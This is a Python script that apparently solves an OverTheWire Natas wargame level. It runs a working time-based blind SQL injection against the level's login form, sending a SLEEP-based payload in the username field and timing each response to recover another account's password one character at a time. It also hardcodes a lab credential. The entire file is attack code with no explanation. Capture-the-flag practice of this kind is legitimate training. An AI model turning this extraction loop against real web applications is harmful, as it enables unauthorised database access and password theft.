import requests
from requests.auth import HTTPBasicAuth
import string
import time
import sys

url = "http://natas17.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')

password = ""
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

# Write to file for clean output
log_file = open('/tmp/natas18_password.log', 'w')
log_file.write("[*] Starting natas18 password extraction via time-based SQL injection...\n")
log_file.flush()

for position in range(1, 33):
    found = False
    msg = f"[+] Position {position}: "
    log_file.write(msg)
    log_file.flush()
    sys.stdout.write(msg)
    sys.stdout.flush()
    
    for char in charset:
        payload = f'natas18" AND BINARY SUBSTRING(password,{position},1)=BINARY "{char}" AND SLEEP(1)-- -'
        
        try:
            start = time.time()
            r = requests.get(url, auth=auth, params={'username': payload}, timeout=5)
            elapsed = time.time() - start
            
            if elapsed >= 0.9:
                password += char
                result = f"'{char}'\n[*] Password so far: {password}\n"
                log_file.write(result)
                log_file.flush()
                sys.stdout.write(result)
                sys.stdout.flush()
                found = True
                break
        except (requests.Timeout, requests.ConnectionError, requests.exceptions.RequestException):
            password += char
            result = f"'{char}' (timeout)\n[*] Password so far: {password}\n"
            log_file.write(result)
            log_file.flush()
            sys.stdout.write(result)
            sys.stdout.flush()
            found = True
            break
        except Exception as e:
            continue
    
    if not found:
        log_file.write("NOT FOUND\n")
        log_file.flush()
        break

final = f"\n[+] Final password: {password}\n"
log_file.write(final)
log_file.flush()
sys.stdout.write(final)
sys.stdout.flush()
log_file.close()